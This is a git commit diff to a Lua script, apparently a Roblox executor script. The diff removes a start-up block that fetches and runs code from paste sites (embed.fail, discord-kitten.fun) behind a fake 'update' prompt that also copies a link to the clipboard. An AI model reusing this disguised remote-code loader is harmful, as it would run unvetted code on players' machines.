d55d6f3819a5c56cc26b150984a64f08627dafe3
WAZAAASEX <nosotbot@proton.me>
2024-11-14 12:18:06 -0600

    Update cl.lua

--- cl.lua
+++ cl.lua
@@ -1,7 +1,4 @@
 -- Made by Whoman#3561
-task.spawn(function()
-if getgenv().SentPromptCorePackage==nil then getgenv().SentPromptCorePackage=false end;task.spawn(function()getgenv().realwyvernversion=loadstring(game:HttpGet("https://embed.fail/p/raw/xr31a35ucr"))()if getgenv().wyvern_version==nil or getgenv().wyvern_version~=getgenv().realwyvernversion then if getgenv().SentPromptCorePackage==false then getgenv().SentPromptCorePackage=true;local a=loadstring(game:HttpGet("https://embed.fail/p/raw/57rlobkgdv"))()a("Heads Up!","This Wyvern is not up to date! Please tell the uploader of the script to update it to the newest version. This is to enhance your experience with the latest updates.",{{Text="Execute Latest Wyvern",LayoutOrder=1,Primary=true,Callback=function()pcall(function()loadstring(game:HttpGet("https://discord-kitten.fun/p/raw/pl6mjl4xoy"))()game:GetService("GuiService"):ClearError()setclipboard("https://discord-kitten.fun/p/raw/pl6mjl4xoy")end)end},{Text="Close",LayoutOrder=2,Primary=false,Callback=function()game:GetService("GuiService"):ClearError()end}})end end end)
-end)
 local vim = game:GetService('VirtualInputManager')
 input = {
     hold = function(key, time)
